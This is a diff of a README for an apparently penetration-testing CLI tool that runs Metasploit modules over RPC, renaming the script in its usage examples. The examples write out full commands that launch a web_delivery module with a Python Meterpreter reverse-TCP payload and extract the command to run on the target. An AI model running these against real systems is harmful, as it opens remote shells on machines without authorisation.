@@ -43,7 +43,7 @@ This project provides a command-line interface (CLI) tool built in Python that i
 To run an exploit with the tool, specify the Metasploit module and options:
 
 ```bash
-python3 metasploit_runner.py <module> --option <OPTION=VALUE> [...] --rpc-server <RPC_SERVER> --rpc-port <RPC_PORT>
+python3 msf-module-executor.py <module> --option <OPTION=VALUE> [...] --rpc-server <RPC_SERVER> --rpc-port <RPC_PORT>
 ```
 
 ### Advanced Usage
@@ -51,7 +51,7 @@ python3 metasploit_runner.py <module> --option <OPTION=VALUE> [...] --rpc-server
 You can also filter the output using a regular expression:
 
 ```bash
-python3 metasploit_runner.py <module> --option <OPTION=VALUE> [...] --regex "<REGEX_PATTERN>" --rpc-server <RPC_SERVER> --rpc-port <RPC_PORT>
+python3 msf-module-executor.py <module> --option <OPTION=VALUE> [...] --regex "<REGEX_PATTERN>" --rpc-server <RPC_SERVER> --rpc-port <RPC_PORT>
 ```
 
 ### Arguments
@@ -68,13 +68,13 @@ python3 metasploit_runner.py <module> --option <OPTION=VALUE> [...] --regex "<RE
 ### Run a Basic Exploit
 
 ```bash
-python3 metasploit_runner.py exploit/multi/script/web_delivery --option LHOST=10.192.0.3 --option LPORT=4450 --option SRVHOST=0.0.0.0 --option SRVPORT=8090 --option URIPATH=/mypayload --option payload=python/meterpreter/reverse_tcp --rpc-server 10.192.0.3 --rpc-port 55552
+python3 msf-module-executor.py exploit/multi/script/web_delivery --option LHOST=10.192.0.3 --option LPORT=4450 --option SRVHOST=0.0.0.0 --option SRVPORT=8090 --option URIPATH=/mypayload --option payload=python/meterpreter/reverse_tcp --rpc-server 10.192.0.3 --rpc-port 55552
 ```
 
 ### Filter Output with a Custom Regex
 
 ```bash
-python3 metasploit_runner.py exploit/multi/script/web_delivery --option LHOST=10.192.0.3 --option LPORT=4450 --option SRVHOST=0.0.0.0 --option SRVPORT=8090 --option URIPATH=/mypayload --option payload=python/meterpreter/reverse_tcp --regex "Run the following command on the target machine:\n(.*)" --rpc-server 10.192.0.3 --rpc-port 55552
+python3 msf-module-executor.py exploit/multi/script/web_delivery --option LHOST=10.192.0.3 --option LPORT=4450 --option SRVHOST=0.0.0.0 --option SRVPORT=8090 --option URIPATH=/mypayload --option payload=python/meterpreter/reverse_tcp --regex "Run the following command on the target machine:\n(.*)" --rpc-server 10.192.0.3 --rpc-port 55552
 ```
 
 ## Logging and Error Handling
